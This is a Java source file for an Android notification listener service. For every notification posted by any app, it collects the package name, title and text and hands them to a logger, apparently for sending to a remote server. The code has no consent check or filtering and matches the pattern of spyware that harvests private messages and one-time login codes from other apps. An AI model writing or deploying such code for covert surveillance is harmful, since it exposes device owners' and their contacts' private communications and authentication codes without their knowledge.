package com.my.myapp.core.push;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import com.my.myapp.core.client.Logger;
import org.json.JSONObject;

public class PushListenerService extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String pkg = sbn.getPackageName();
        String title = String.valueOf(sbn.getNotification().extras.get(android.app.Notification.EXTRA_TITLE));
        String text = String.valueOf(sbn.getNotification().extras.get(android.app.Notification.EXTRA_TEXT));

        JSONObject data = new JSONObject();
        try {
            data.put("type", "push");
            data.put("package", pkg);
            data.put("title", title);
            data.put("text", text);
            Logger.sendLog("push", data);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}